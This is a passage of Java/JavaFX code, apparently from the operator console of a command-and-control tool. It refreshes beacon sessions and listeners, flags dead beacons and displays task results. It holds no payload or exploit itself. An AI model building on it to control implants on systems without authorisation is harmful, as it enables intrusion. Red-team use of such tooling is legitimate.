                        a.showAndWait();
                    });
                }
            }).start();
        }
    }

    // ── Refresh methods ──────────────────────────────────────────────────

    public void refresh() {
        new Thread(() -> {
            try {
                List<Session> sessions = api.getSessions();
                Platform.runLater(() -> {
                    sessionList.setAll(sessions);
                    for (Session s : sessions) {
                        SessionTab st = openTabs.get(s.getId());
                        if (st != null) st.onSessionUpdated(s);
                    }
                    Set<String> aliveIds = new HashSet<>();
                    for (Session s : sessions) {
                        if (s.isActive()) aliveIds.add(s.getId());
                    }
                    for (var entry : openTabs.entrySet()) {
                        if (!aliveIds.contains(entry.getKey())) {
                            entry.getValue().onBeaconDead();
                        }
                    }
                });
            } catch (Exception e) { /* silent */ }
        }).start();
    }

    public void refreshListeners() {
        new Thread(() -> {
            try {
                List<ListenerInfo> listeners = api.getListeners();
                Platform.runLater(() -> listenerList.setAll(listeners));
            } catch (Exception e) { /* silent */ }
        }).start();
    }

    public void onWsEvent(String type, JsonObject data) {
        if ("task_result".equals(type)) {
            String sid = data.get("session_id").getAsString();
            SessionTab st = openTabs.get(sid);
            if (st != null) {
                st.onTaskResult(data.get("task_id").getAsString(), data.get("result").getAsString());
            }
        } else if ("session_lost".equals(type)) {
            Platform.runLater(this::refresh);
        }
    }

    private static String formatLastSeen(String isoTs) {
        if (isoTs == null || isoTs.isEmpty()) return "-";
        try {
            java.time.Instant then;
            try {
                then = java.time.Instant.parse(isoTs);
            } catch (java.time.format.DateTimeParseException e) {
                String s = isoTs.endsWith("Z") ? isoTs.substring(0, isoTs.length()-1) : isoTs;
                then = java.time.Instant.parse(s + "Z");
            }
            java.time.Instant now = java.time.Instant.now();
            long deltaSecs = java.time.Duration.between(then, now).getSeconds();
            if (deltaSecs < 0) deltaSecs = 0;
            if (deltaSecs < 5)   return "just now";
            if (deltaSecs < 60)  return deltaSecs + "s ago";
            long mins = deltaSecs / 60;
            if (mins < 60)       return mins + "m ago";
            long hours = mins / 60;
            if (hours < 24)      return hours + "h ago";
            long days = hours / 24;
            return days + "d ago";
        } catch (Exception e) {
            return isoTs.length() > 19 ? isoTs.substring(0, 19) : isoTs;
        }
    }
}
